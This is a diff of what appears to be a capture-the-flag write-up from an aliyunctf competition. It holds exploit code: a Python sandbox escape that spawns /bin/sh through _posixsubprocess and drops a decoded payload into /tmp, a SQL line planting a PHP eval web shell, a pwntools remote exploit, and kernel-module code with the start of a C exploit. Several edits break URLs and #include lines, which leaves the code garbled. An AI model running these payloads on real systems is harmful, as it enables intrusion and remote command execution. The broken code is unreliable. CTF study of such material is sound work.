@@ -50,12 +50,14 @@ _posixsubprocess.fork_exec([b"/bin/sh","-c", "echo'{poc2}'|base64 -d>/tmp/1.py"]
 """
 
         resp1 = requests.post(
-                "http://121.41.238.106:63837/api/submit",
+                "http://121.41.238.106:
+63837/api/submit",
                 json={"problem_id": "0", "code": payload2},
             )
         start_time = time.time()
         resp2 = requests.post(
-            "http://121.41.238.106:63837/api/submit",
+            "http://121.41.238.106:
+63837/api/submit",
             json={"problem_id": "0", "code": payload1},
         )
 
@@ -287,11 +289,6 @@ ChaMd5 Venom 招收大佬入圈
 import _posixsubprocess
 import os
 _posixsubprocess.fork_exec([b"/bin/sh","-c", "ls"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
-```
-
-
-
-```
 import base64
 
 import requests
@@ -323,12 +320,14 @@ _posixsubprocess.fork_exec([b"/bin/sh","-c", "echo'{poc2}'|base64 -d>/tmp/1.py"]
 """
 
         resp1 = requests.post(
-                "http://121.41.238.106:63837/api/submit",
+                "http://121.41.238.106:
+63837/api/submit",
                 json={"problem_id": "0", "code": payload2},
             )
         start_time = time.time()
         resp2 = requests.post(
-            "http://121.41.238.106:63837/api/submit",
+            "http://121.41.238.106:
+63837/api/submit",
             json={"problem_id": "0", "code": payload1},
         )
 
@@ -342,23 +341,8 @@ _posixsubprocess.fork_exec([b"/bin/sh","-c", "echo'{poc2}'|base64 -d>/tmp/1.py"]
     else:
         flag += "n"
         break
-```
-
-
-
-```
 aliyunctf{bb050a11-f64e-4137-8e94-59a37b0ed427}
-```
-
-
-
-```
 select "&lt;?php eval($_POST['cmd']);?&gt;" into outfile "/var/www/html/shell.php"
-```
-
-
-
-```
 int r4 = ctaid_x * ntid_x + tid_x;
 if (tid_x>= ntid_x){
         return;
@@ -464,33 +448,18 @@ for(int i=0;i<10485760;i+=8)
         r252 -= 239350328;
         
 }
-```
-
-
-
-```
 from pwn import *
 r=remote("121.41.238.106",51845)
 payload = b'95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y) + 95791394*(x^y)+ 95791394*(x^y)'
 r.sendline(payload)
 r.interactive()
-#aliyunctf{251e4bb0-b430-40cd-b09b-79a48b2ea2d8}
-```
-
-
-
-```
+    #aliyunctf{251e4bb0-b430-40cd-b09b-79a48b2ea2d8}
 struct alimem_page {
     void *virt;
     phys_addr_t phys;
     atomic_t refcount;
     struct rcu_head rcu;
 };
-```
-
-
-
-```
 struct alimem_write {
     int idx;
     unsigned int offset;
@@ -503,29 +472,14 @@ struct alimem_read {
     char __user *data;
     size_t size;
 };
-```
-
-
-
-```
 static struct alimem_page *pages[MAX_PAGES];
 static DECLARE_RWSEM(pages_lock);
-```
-
-
-
-```
 static void free_page_rcu(struct rcu_head *rcu)
 {
     struct alimem_page *page = container_of(rcu, struct alimem_page, rcu);
     free_pages((unsigned long)page->virt, PAGE_ORDER);
     kfree(page);
 }
-```
-
-
-
-```
 static void alimem_vma_close(struct vm_area_struct *vma)
 {
     struct alimem_page *page = vma->vm_private_data;
@@ -539,20 +493,10 @@ static void alimem_vma_open(struct vm_area_struct *vma)
     struct alimem_page *page = vma->vm_private_data;
     atomic_inc(&page->refcount);
 }
-```
-
-
-
-```
 static const struct vm_operations_struct alimem_vm_ops = {
     .open = alimem_vma_open,
     .close = alimem_vma_close,
 };
-```
-
-
-
-```
 static int alimem_mmap(struct file *filp, struct vm_area_struct *vma)
 {
     int idx = vma->vm_pgoff;
@@ -587,11 +531,6 @@ static int alimem_mmap(struct file *filp, struct vm_area_struct *vma)
     rcu_read_unlock();
     return ret;
 }
-```
-
-
-
-```
 static int __init alimem_init(void) { return misc_register(&alimem_dev); }
 static void __exit alimem_exit(void) {
     int idx;
@@ -608,23 +547,18 @@ static void __exit alimem_exit(void) {
     up_write(&pages_lock);
     misc_deregister(&alimem_dev);
 }
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/mman.h>
-#include <pthread.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#define ALIMEM_ALLOC 0x1337
-#define ALIMEM_FREE 0x1338
-#define ALIMEM_WRITE 0x1339
-#define ALIMEM_READ 0x133a
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
+    #include <fcntl.h>
+    #include <sys/mman.h>
+    #include 
+    #include <string.h>
+    #include <sys/ioctl.h>
+    #define ALIMEM_ALLOC 0x1337
+    #define ALIMEM_FREE 0x1338
+    #define ALIMEM_WRITE 0x1339
+    #define ALIMEM_READ 0x133a
 // 数据结构定义
 struct alimem_write {
     int idx;
